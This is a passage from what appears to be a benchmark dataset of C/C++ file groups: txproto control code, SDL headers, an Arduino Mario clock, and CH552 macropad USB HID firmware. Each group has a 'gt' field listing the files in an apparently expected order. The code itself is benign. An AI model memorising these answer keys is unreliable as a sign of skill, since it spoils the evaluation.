        "content": "'txproto/src/include/libtxproto/txproto_main.h'\n:\n\n#pragma once\n\n#include <signal.h>\n#include <stdatomic.h>\n\n#include <libtxproto/log.h>\n#include <libtxproto/utils.h>\n\n#include \"version.h\"\n#include \"../config.h\"\n\ntypedef struct TXMainContext {\n    SPClass *class;\n\n    struct TXCLIContext *cli;\n    struct TXLuaContext *lua;\n\n    int lua_exit_code;\n\n    int source_update_cb_ref;\n\n    atomic_int_fast64_t epoch_value;\n\n    AVBufferRef **io_api_ctx;\n\n    SPBufferList *events;\n    SPBufferList *ext_buf_refs;\n} TXMainContext;\n\n#include \"cli.h\"\n#include \"lua_common.h\"\n\n'txproto/src/control.c'\n:\n\n#include \"../config.h\"\n\n#ifdef HAVE_INTERFACE\n#include \"interface_common.h\"\n#endif\n\n#include \"iosys_common.h\"\n\n#include <libtxproto/control.h>\n#include <libtxproto/commit.h>\n#include <libtxproto/encode.h>\n#include <libtxproto/decode.h>\n#include <libtxproto/mux.h>\n#include <libtxproto/filter.h>\n\nctrl_fn sp_get_ctrl_fn(void *ctx)\n{\n    enum SPType type = sp_class_get_type(ctx);\n    switch (type) {\n    case SP_TYPE_ENCODER:\n        return sp_encoder_ctrl;\n    case SP_TYPE_MUXER:\n        return sp_muxer_ctrl;\n    case SP_TYPE_DECODER:\n        return sp_decoder_ctrl;\n    case SP_TYPE_DEMUXER:\n        return sp_demuxer_ctrl;\n    case SP_TYPE_FILTER:\n        return sp_filter_ctrl;\n#ifdef HAVE_INTERFACE\n    case SP_TYPE_INTERFACE:\n        return sp_interface_ctrl;\n#endif\n    case SP_TYPE_AUDIO_SOURCE:\n    case SP_TYPE_AUDIO_SINK:\n    case SP_TYPE_AUDIO_BIDIR:\n    case SP_TYPE_VIDEO_SOURCE:\n    case SP_TYPE_VIDEO_SINK:\n    case SP_TYPE_VIDEO_BIDIR:\n    case SP_TYPE_SUB_SOURCE:\n    case SP_TYPE_SUB_SINK:\n    case SP_TYPE_SUB_BIDIR:\n        return ((IOSysEntry *)ctx)->ctrl;\n    default:\n        break;\n    }\n    return NULL;\n}\n\nint sp_generic_ctrl(TXMainContext *ctx,\n                    AVBufferRef *ref,\n                    SPEventType flags,\n                    void *arg)\n{\n    int err;\n\n    ctrl_fn fn = sp_get_ctrl_fn(ref->data);\n    if (!fn) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unsupported CTRL type: %s!\",\n               sp_class_type_string(ref->data));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_CTRL_MASK)) {\n        sp_log(ctx, SP_LOG_ERROR, \"Missing ctrl: command: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if (flags & SP_EVENT_ON_MASK) {\n        sp_log(ctx, SP_LOG_ERROR, \"Event specified but given to a ctrl, use %s.schedule: %s!\",\n               sp_class_get_name(ref->data), av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if ((flags & SP_EVENT_CTRL_OPTS) && (!arg)) {\n        sp_log(ctx, SP_LOG_ERROR, \"No options specified for ctrl:opts: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    }\n\n    if (flags & SP_EVENT_CTRL_START)\n        err = fn(ref, flags, &ctx->epoch_value);\n    else\n        err = fn(ref, flags, arg);\n    if (err < 0) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to process CTRL: %s\",\n               av_err2str(err));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_FLAG_IMMEDIATE))\n        sp_add_commit_fn_to_list(ctx, fn, ref);\n\n    return 0;\n}\n\n'txproto/src/cli.h'\n:\n\n#pragma once\n\n#include <libtxproto/txproto_main.h>\n\ntypedef struct TXCLIContext TXCLIContext;\n\n\nint sp_cli_init(TXCLIContext **s, TXMainContext *ctx);\n\n\nint sp_cli_prompt_event(TXCLIContext *cli_ctx, AVBufferRef *event, const char *msg);\n\n\nvoid sp_cli_uninit(TXCLIContext **s);\n\n'txproto/src/include/libtxproto/control.h'\n:\n\n#pragma once\n\n#include <libtxproto/txproto_main.h>\n\nctrl_fn sp_get_ctrl_fn(void *ctx);\n\nint sp_generic_ctrl(TXMainContext *ctx,\n                    AVBufferRef *ref,\n                    SPEventType flags,\n                    void *arg);\n",
        "gt": [
            "'txproto/src/cli.h'",
            "'txproto/src/include/libtxproto/txproto_main.h'",
            "'txproto/src/include/libtxproto/control.h'",
            "'txproto/src/control.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'\n:\n\n#ifndef _SDL_thread_h\n#define _SDL_thread_h\n\n\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n\n#include \"SDL_atomic.h\"\n#include \"SDL_mutex.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nstruct SDL_Thread;\ntypedef struct SDL_Thread SDL_Thread;\n\n\ntypedef unsigned long SDL_threadID;\n\n\ntypedef unsigned int SDL_TLSID;\n\n\ntypedef enum {\n    SDL_THREAD_PRIORITY_LOW,\n    SDL_THREAD_PRIORITY_NORMAL,\n    SDL_THREAD_PRIORITY_HIGH\n} SDL_ThreadPriority;\n\n\ntypedef int (SDLCALL * SDL_ThreadFunction) (void *data);\n\n#if defined(__WIN32__) && !defined(HAVE_LIBC)\n\n#define SDL_PASSED_BEGINTHREAD_ENDTHREAD\n#include <process.h>\n\ntypedef uintptr_t(__cdecl * pfnSDL_CurrentBeginThread) (void *, unsigned,\n                                                        unsigned (__stdcall *\n                                                                  func) (void\n                                                                         *),\n                                                        void *arg, unsigned,\n                                                        unsigned *threadID);\ntypedef void (__cdecl * pfnSDL_CurrentEndThread) (unsigned code);\n\n\nextern DECLSPEC SDL_Thread *SDLCALL\nSDL_CreateThread(SDL_ThreadFunction fn, const char *name, void *data,\n                 pfnSDL_CurrentBeginThread pfnBeginThread,\n                 pfnSDL_CurrentEndThread pfnEndThread);\n\n\n#if defined(SDL_CreateThread) && SDL_DYNAMIC_API\n#undef SDL_CreateThread\n#define SDL_CreateThread(fn, name, data) SDL_CreateThread_REAL(fn, name, data, (pfnSDL_CurrentBeginThread)_beginthreadex, (pfnSDL_CurrentEndThread)_endthreadex)\n#else\n#define SDL_CreateThread(fn, name, data) SDL_CreateThread(fn, name, data, (pfnSDL_CurrentBeginThread)_beginthreadex, (pfnSDL_CurrentEndThread)_endthreadex)\n#endif\n\n#else\n\n\nextern DECLSPEC SDL_Thread *SDLCALL\nSDL_CreateThread(SDL_ThreadFunction fn, const char *name, void *data);\n\n#endif\n\n\nextern DECLSPEC const char *SDLCALL SDL_GetThreadName(SDL_Thread *thread);\n\n\nextern DECLSPEC SDL_threadID SDLCALL SDL_ThreadID(void);\n\n\nextern DECLSPEC SDL_threadID SDLCALL SDL_GetThreadID(SDL_Thread * thread);\n\n\nextern DECLSPEC int SDLCALL SDL_SetThreadPriority(SDL_ThreadPriority priority);\n\n\nextern DECLSPEC void SDLCALL SDL_WaitThread(SDL_Thread * thread, int *status);\n\n\nextern DECLSPEC void SDLCALL SDL_DetachThread(SDL_Thread * thread);\n\n\nextern DECLSPEC SDL_TLSID SDLCALL SDL_TLSCreate(void);\n\n\nextern DECLSPEC void * SDLCALL SDL_TLSGet(SDL_TLSID id);\n\n\nextern DECLSPEC int SDLCALL SDL_TLSSet(SDL_TLSID id, const void *value, void (*destructor)(void*));\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_timer.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_timer.h'\n:\n\n#ifndef _SDL_timer_h\n#define _SDL_timer_h\n\n\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_GetTicks(void);\n\n\n#define SDL_TICKS_PASSED(A, B)  ((Sint32)((B) - (A)) <= 0)\n\n\nextern DECLSPEC Uint64 SDLCALL SDL_GetPerformanceCounter(void);\n\n\nextern DECLSPEC Uint64 SDLCALL SDL_GetPerformanceFrequency(void);\n\n\nextern DECLSPEC void SDLCALL SDL_Delay(Uint32 ms);\n\n\ntypedef Uint32 (SDLCALL * SDL_TimerCallback) (Uint32 interval, void *param);\n\n\ntypedef int SDL_TimerID;\n\n\nextern DECLSPEC SDL_TimerID SDLCALL SDL_AddTimer(Uint32 interval,\n                                                 SDL_TimerCallback callback,\n                                                 void *param);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_RemoveTimer(SDL_TimerID id);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_common_h\n#define _SDL_test_common_h\n\n#include \"SDL.h\"\n\n#if defined(__PSP__)\n#define DEFAULT_WINDOW_WIDTH  480\n#define DEFAULT_WINDOW_HEIGHT 272\n#else\n#define DEFAULT_WINDOW_WIDTH  640\n#define DEFAULT_WINDOW_HEIGHT 480\n#endif\n\n#define VERBOSE_VIDEO   0x00000001\n#define VERBOSE_MODES   0x00000002\n#define VERBOSE_RENDER  0x00000004\n#define VERBOSE_EVENT   0x00000008\n#define VERBOSE_AUDIO   0x00000010\n\ntypedef struct\n{\n\n    char **argv;\n    Uint32 flags;\n    Uint32 verbose;\n\n\n    const char *videodriver;\n    int display;\n    const char *window_title;\n    const char *window_icon;\n    Uint32 window_flags;\n    int window_x;\n    int window_y;\n    int window_w;\n    int window_h;\n    int window_minW;\n    int window_minH;\n    int window_maxW;\n    int window_maxH;\n    int logical_w;\n    int logical_h;\n    float scale;\n    int depth;\n    int refresh_rate;\n    int num_windows;\n    SDL_Window **windows;\n\n\n    const char *renderdriver;\n    Uint32 render_flags;\n    SDL_bool skip_renderer;\n    SDL_Renderer **renderers;\n    SDL_Texture **targets;\n\n\n    const char *audiodriver;\n    SDL_AudioSpec audiospec;\n\n\n    int gl_red_size;\n    int gl_green_size;\n    int gl_blue_size;\n    int gl_alpha_size;\n    int gl_buffer_size;\n    int gl_depth_size;\n    int gl_stencil_size;\n    int gl_double_buffer;\n    int gl_accum_red_size;\n    int gl_accum_green_size;\n    int gl_accum_blue_size;\n    int gl_accum_alpha_size;\n    int gl_stereo;\n    int gl_multisamplebuffers;\n    int gl_multisamplesamples;\n    int gl_retained_backing;\n    int gl_accelerated;\n    int gl_major_version;\n    int gl_minor_version;\n    int gl_debug;\n    int gl_profile_mask;\n} SDLTest_CommonState;\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nSDLTest_CommonState *SDLTest_CommonCreateState(char **argv, Uint32 flags);\n\n\nint SDLTest_CommonArg(SDLTest_CommonState * state, int index);\n\n\nconst char *SDLTest_CommonUsage(SDLTest_CommonState * state);\n\n\nSDL_bool SDLTest_CommonInit(SDLTest_CommonState * state);\n\n\nvoid SDLTest_CommonEvent(SDLTest_CommonState * state, SDL_Event * event, int *done);\n\n\nvoid SDLTest_CommonQuit(SDLTest_CommonState * state);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_timer.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Object.h'",
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/Clockface.h'",
            "'mariobros-clock/Sprite.h'"
        ],
        "content": "'mariobros-clock/EventBus.h'\n:\n#ifndef EventBus_h\n#define EventBus_h\n\n#include <Arduino.h>\n#include \"EventTask.h\"\n#include \"Sprite.h\"\n\nclass EventBus {\n  private:\n    EventTask* _subscriptions[5];\n    uint8_t _subNum = 0;\n\n  public:\n    void broadcast(EventType event, Sprite* sender);\n    void subscribe(EventTask* task);\n\n};\n\n\n#endif\n\n'mariobros-clock/Object.h'\n:\n#ifndef Object_h\n#define Object_h\n\n#include \"Locator.h\"\n\nstruct Object {\n  const unsigned short *_image;\n  int _width;\n  int _height;\n\n  Object(const unsigned short *image, int width, int height) {\n    this->_image = image;\n    this->_width = width;\n    this->_height = height;\n  }\n\n  void draw(int x, int y) {\n    Locator::getDisplay()->drawRGBBitmap(x, y, _image, _width, _height);\n  }\n\n};\n\n\n#endif\n'mariobros-clock/Locator.h'\n:#ifndef Locator_h\n#define Locator_h\n\n\n#include <Adafruit_GFX.h>\n#include \"EventBus.h\"\n\nclass Locator {\n  private:\n    static Adafruit_GFX* _display;\n    static EventBus* _eventBus;\n\n  public:\n    static Adafruit_GFX* getDisplay();\n    static EventBus* getEventBus();\n    static void provide(Adafruit_GFX* display);\n    static void provide(EventBus* eventBus);\n};\n\n\n#endif\n'mariobros-clock/Clockface.h'\n:#ifndef MarioClockface_h\n#define MarioClockface_h\n\n#include \"Super_Mario_Bros__24pt7b.h\"\n\n#include <Adafruit_GFX.h>\n#include \"Tile.h\"\n#include \"Locator.h\"\n#include \"Game.h\"\n#include \"Object.h\"\n\n#include \"IClockface.h\"\n#include \"CWDateTime.h\"\n\n#include \"assets.h\"\n#include \"mario.h\"\n#include \"block.h\"\n\nclass Clockface: public IClockface {\n  private:\n    Adafruit_GFX* _display;\n    CWDateTime* _dateTime;\n    void updateTime();\n\n  public:\n    Clockface(Adafruit_GFX* display);\n    void setup(CWDateTime *dateTime);\n    void update();\n    void externalEvent(int type);\n};\n\n#endif\n\n'mariobros-clock/Sprite.h'\n:\n#ifndef Sprite_h\n#define Sprite_h\n\n#include <Arduino.h>\n\nclass Sprite {\n\n  protected:\n    uint8_t _x;\n    uint8_t _y;\n    uint8_t _width;\n    uint8_t _height;\n\n  public:\n    boolean collidedWith(Sprite* sprite);\n    void logPosition();\n\n    virtual const char* name();\n};\n\n\n#endif\n",
        "gt": [
            "'mariobros-clock/Sprite.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/Object.h'",
            "'mariobros-clock/Clockface.h'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/config.h'\n:\n\n\n\n#pragma once\n\n\n#define PIN_NEO             P16\n#define PIN_KEY1            P17\n#define PIN_KEY2            P31\n#define PIN_KEY3            P30\n#define PIN_KEY4            P15\n#define PIN_KEY5            P14\n#define PIN_KEY6            P32\n#define PIN_ENC_A           P34\n#define PIN_ENC_B           P33\n#define PIN_ENC_SW          P11\n\n\n#define NEO_COUNT           18\n#define NEO_GRB\n\n\n#define USB_VENDOR_ID       0x1189\n#define USB_PRODUCT_ID      0x8890\n#define USB_DEVICE_VERSION  0x0100\n\n\n#define USB_MAX_POWER_mA    150\n\n\n#define MANUFACTURER_STR    'w','a','g','i','m','i','n','a','t','o','r'\n#define PRODUCT_STR         'M','a','c','r','o','P','a','d'\n#define SERIAL_STR          'C','H','5','5','2','x','H','I','D'\n#define INTERFACE_STR       'H','I','D','-','K','e','y','b','o','a','r','d'\n\n'CH552-MacroPad-plus/software/src/usb_composite.c'\n:\n\n\n\n\n\n\n\n#include \"usb_composite.h\"\n\n#include \"usb_hid.h\"\n\n#include \"usb_handler.h\"\n\n\n\n#define KBD_sendReport()    HID_sendReport(KBD_report, sizeof(KBD_report))\n\n#define CON_sendReport()    HID_sendReport(CON_report, sizeof(CON_report))\n\n#define JOY_sendReport()    HID_sendReport(JOY_report, sizeof(JOY_report))\n\n#define MOUSE_sendReport()  HID_sendReport(MOUSE_report, sizeof(MOUSE_report))\n\n\n\n\n\n\n\n\n\n__xdata uint8_t KBD_report[]   = {1,0,0,0,0,0,0,0};\n\n__xdata uint8_t CON_report[]   = {2,0,0};\n\n__xdata uint8_t MOUSE_report[] = {3,0,0,0,0};\n\n__xdata uint8_t JOY_report[]   = {4,0,0,0};\n\n\n\n\n\n\n\n\n\n__code uint8_t KBD_map[128] = {\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2a, 0x2b, 0x28, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x2c, 0x9e, 0xb4, 0xa0, 0xa1, 0xa2, 0xa4, 0x34, 0xa6, 0xa7,\n\n  0xa5, 0xae, 0x36, 0x2d, 0x37, 0x38, 0x27, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24,\n\n  0x25, 0x26, 0xb3, 0x33, 0xb6, 0x2e, 0xb7, 0xb8, 0x9f, 0x84, 0x85, 0x86, 0x87, 0x88,\n\n  0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,\n\n  0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x2f, 0x31, 0x30, 0xa3, 0xad, 0x35, 0x04,\n\n  0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,\n\n  0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0xaf, 0xb1, 0xb0,\n\n  0xb5, 0x00\n\n};\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid KBD_press(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] |= (1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] |= 0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) return;\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == 0) {\n\n      KBD_report[i] = key;\n\n      KBD_sendReport();\n\n      return;\n\n    }\n\n  }\n\n}\n\n\n\n\n\nvoid KBD_release(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] &= ~(1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] &= ~0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) KBD_report[i] = 0;\n\n  }\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_type(uint8_t key) {\n\n  KBD_press(key);\n\n  KBD_release(key);\n\n}\n\n\n\n\n\nvoid KBD_releaseAll(void) {\n\n  uint8_t i;\n\n  for(i=7; i; i--) KBD_report[i] = 0;\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_print(char* str) {\n\n  while(*str) KBD_type(*str++);\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid CON_press(uint8_t key) {\n\n  CON_report[1] = key;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_release(void) {\n\n  CON_report[1] = 0;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_type(uint8_t key) {\n\n  CON_press(key);\n\n  CON_release();\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid MOUSE_press(uint8_t buttons) {\n\n  MOUSE_report[1] |= buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_release(uint8_t buttons) {\n\n  MOUSE_report[1] &= ~buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_move(int8_t xrel, int8_t yrel) {\n\n  MOUSE_report[2] = (uint8_t)xrel;\n\n  MOUSE_report[3] = (uint8_t)yrel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[2] = 0;\n\n  MOUSE_report[3] = 0;\n\n}\n\n\n\n\n\nvoid MOUSE_wheel(int8_t rel) {\n\n  MOUSE_report[4] = (uint8_t)rel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[4] = 0;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid JOY_press(uint8_t buttons) {\n\n  JOY_report[1] |= buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_release(uint8_t buttons) {\n\n  JOY_report[1] &= ~buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_move(int8_t xrel, int8_t yrel) {\n\n  JOY_report[2] = (uint8_t)xrel;\n\n  JOY_report[3] = (uint8_t)yrel;\n\n  JOY_sendReport();\n\n}\n\n\n'CH552-MacroPad-plus/software/src/usb_descr.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb.h\"\n#include \"config.h\"\n\n\n\n\n#define EP0_SIZE        8\n#define EP1_SIZE        8\n#define EP2_SIZE        8\n\n#define EP0_ADDR        0\n#define EP1_ADDR        (EP0_ADDR + 